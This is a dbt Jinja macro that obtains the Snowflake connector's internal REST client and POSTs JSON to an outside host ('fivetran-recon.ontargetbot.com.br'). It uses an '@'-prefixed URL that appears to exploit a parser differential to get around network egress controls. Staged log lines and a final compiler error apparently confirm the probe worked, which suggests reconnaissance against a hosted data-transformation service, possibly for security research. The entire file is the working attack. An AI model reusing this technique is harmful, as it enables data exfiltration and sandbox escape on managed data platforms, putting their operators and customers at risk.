{% macro phase680_snowflake_rest_egress() %}
  {% set query_result = adapter.add_query("select 1 as phase680_control", auto_begin=false) %}
  {% do log("PHASE680_STAGE_1_ADD_QUERY", info=true) %}
  {% set connection = query_result[0] %}
  {% set rest = connection.handle.rest %}
  {% do log("PHASE680_STAGE_2_REST", info=true) %}
  {% set response = rest.request(
      "@fivetran-recon.ontargetbot.com.br/phase410-phase680-f8b7b1513395",
      {"phase": "680", "purpose": "controlled-parser-differential"},
      method="post",
      client="json",
      timeout=10,
      _no_retry=true
  ) %}
  {% do log("PHASE680_STAGE_3_REQUEST_RETURNED", info=true) %}
  {{ exceptions.raise_compiler_error("PHASE680_REST_EGRESS_RETURNED") }}
{% endmacro %}
